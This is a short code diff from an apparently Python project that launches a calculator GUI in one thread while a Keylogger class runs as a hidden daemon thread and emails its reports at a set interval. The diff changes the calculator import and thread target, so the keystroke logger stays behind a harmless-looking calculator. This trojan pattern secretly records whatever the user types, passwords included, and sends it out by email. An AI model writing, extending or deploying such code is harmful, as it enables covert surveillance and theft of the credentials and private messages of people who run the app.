@@ -12,7 +12,10 @@ import config
 import helper
 
 # import text-based calculator (redundant with tkinter)
-from txt_based_calc import *
+# import txt_based_calc as txtc
+
+# import calculator GUI
+import calc
 
 # global parameters
 # seconds before email is sent (modify to your liking)
@@ -120,14 +123,13 @@ class Keylogger:
         keyboard.wait()
 
 if __name__ == '__main__':
-    # initialise both classes
-    calc = Calculator()
+    # initialise logger
     my_logger = Keylogger(interval=REPORT_INTERVAL, report_mode='email')
 
     # use threading to begin the two tasks
     # By setting t2 (logger) to daemon, they're killed when the main program ends
     # https://www.geeksforgeeks.org/python-different-ways-to-kill-a-thread/
-    t1 = Thread(target=calc.driver)
+    t1 = Thread(target=calc.calc_init)
     t2 = Thread(target=my_logger.start)
     t2.daemon = True
 
